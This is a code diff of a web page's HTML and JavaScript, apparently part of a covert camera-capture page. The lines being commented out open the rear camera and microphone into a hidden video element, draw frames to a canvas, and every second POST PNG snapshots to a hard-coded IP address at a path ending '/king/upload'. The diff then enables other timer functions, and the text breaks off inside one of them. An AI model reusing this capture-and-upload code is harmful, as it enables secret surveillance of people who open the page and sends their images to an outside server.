@@ -12,9 +12,9 @@
 </head>
 
 <body>
-  <div><video id="v1" width="340" height="330" hidden></video></div>
+  <!-- <div><video id="v1" width="340" height="330" hidden></video></div>
   <!-- <video id="v2" width="100%" height="30%"></video> -->
-  <div><canvas id="c1" width="340" height="240"></canvas></div>
+  <!-- <div><canvas id="c1" width="340" height="240"></canvas></div> -->
   <div><canvas id="c2" width="340" height="240"></canvas></div>
   <textarea id="app" rows="10" cols="35" disabled="disabled" readonly font-size:8px>
     {{ message }}
@@ -28,90 +28,90 @@
       }
     })
 
-    try {
-      var opt = {
-        audio: true,
-        video: {
-          facingMode: "environment",
-          width: 360,
-          height: 720
-        }
-      };
+    // try {
+    //   var opt = {
+    //     audio: true,
+    //     video: {
+    //       facingMode: "environment",
+    //       width: 360,
+    //       height: 720
+    //     }
+    //   };
 
-      if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia != undefined) {
-        log("navigator.mediaDevices.getUserMedia");
-      }
+    //   if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia != undefined) {
+    //     log("navigator.mediaDevices.getUserMedia");
+    //   }
 
-      if (navigator.getUserMedia) {
-        log("navigator.getUserMedia");
-      }
+    //   if (navigator.getUserMedia) {
+    //     log("navigator.getUserMedia");
+    //   }
 
-      if (navigator.webkitGetUserMedia) {
-        log("navigator.webkitGetUserMedia");
-      }
+    //   if (navigator.webkitGetUserMedia) {
+    //     log("navigator.webkitGetUserMedia");
+    //   }
 
-      var video1 = document.querySelector('#v1');
+    //   var video1 = document.querySelector('#v1');
 
-      if (navigator.mozGetUserMedia) {
-        log("navigator.mozGetUserMedia");
-        navigator.mediaDevices.getUserMedia(opt)
-          .then(function (mediaStream) {
-            video1.srcObject = mediaStream;
-            video1.onloadedmetadata = function (e) {
-              video1.play();
-            };
-          })
-          .catch(function (err) {
-            log(err.name + ": " + err.message);
-          }); // always check for errors at the end.
-      }
-    } catch (err) {
-      log(err.name + ": " + err.message);
-    }
+    //   if (navigator.mozGetUserMedia) {
+    //     log("navigator.mozGetUserMedia");
+    //     navigator.mediaDevices.getUserMedia(opt)
+    //       .then(function (mediaStream) {
+    //         video1.srcObject = mediaStream;
+    //         video1.onloadedmetadata = function (e) {
+    //           video1.play();
+    //         };
+    //       })
+    //       .catch(function (err) {
+    //         log(err.name + ": " + err.message);
+    //       }); // always check for errors at the end.
+    //   }
+    // } catch (err) {
+    //   log(err.name + ": " + err.message);
+    // }
 
-    self.setInterval("clock()", 50);
+    // self.setInterval("clock()", 50);
 
-    self.setInterval("clock2()", 1000);
+    // self.setInterval("clock2()", 500);
 
-    // self.setInterval("clock22()", 800);
+    self.setInterval("clock22()", 800);
 
-    // self.setInterval("clock3()", 1000);
+    self.setInterval("clock3()", 1000);
 
-    var canvas = document.querySelector('#c1');
+    // var canvas = document.querySelector('#c1');
     var canvas2 = document.querySelector('#c2');
-    let context = canvas.getContext('2d');
+    // let context = canvas.getContext('2d');
     let context2 = canvas2.getContext('2d');
 
     var json = {};
     
     var imagelist = [];
 
-    function clock() {
-      context.drawImage(video1, 0, 0, 330, 330);
-    }
+    // function clock() {
+    //   context.drawImage(video1, 0, 0, 330, 330);
+    // }
 
-    function clock2() {
-      var dataurl = canvas.toDataURL("image/png");
-      var videoPhotos1 = encodeURIComponent(dataurl);
-      json["data"] = videoPhotos1;
-      try {
-        var xhr = new XMLHttpRequest();
-        xhr.open("POST", "https://8.211.165.99:6061/king/upload", true);
-        xhr.setRequestHeader('Content-type', 'application/json');  //设置为表单方式提交
-        xhr.onreadystatechange = function () {  //绑定响应状态事件监听函数
-          if (xhr.readyState == 4) {  //监听readyState状态
-            if (xhr.status == 200 || xhr.status == 0) {  //监听HTTP状态码
+    // function clock2() {
+    //   var dataurl = canvas.toDataURL("image/png");
+    //   var videoPhotos1 = encodeURIComponent(dataurl);
+    //   json["data"] = videoPhotos1;
+    //   try {
+    //     var xhr = new XMLHttpRequest();
+    //     xhr.open("POST", "https://8.211.165.99:6061/king/upload", true);
+    //     xhr.setRequestHeader('Content-type', 'application/json');  //设置为表单方式提交
+    //     xhr.onreadystatechange = function () {  //绑定响应状态事件监听函数
+    //       if (xhr.readyState == 4) {  //监听readyState状态
+    //         if (xhr.status == 200 || xhr.status == 0) {  //监听HTTP状态码
               
-            } else {
-              log("上传失败");
-            }
-          }
-        }
-        xhr.send(JSON.stringify(json));  //发送请求
-      } catch (e) {
-        log(e);
-      }
-    }
+    //         } else {
+    //           log("上传失败");
+    //         }
+    //       }
+    //     }
+    //     xhr.send(JSON.stringify(json));  //发送请求
+    //   } catch (e) {
+    //     log(e);
+    //   }
+    // }
 
     function clock22() {
       try {
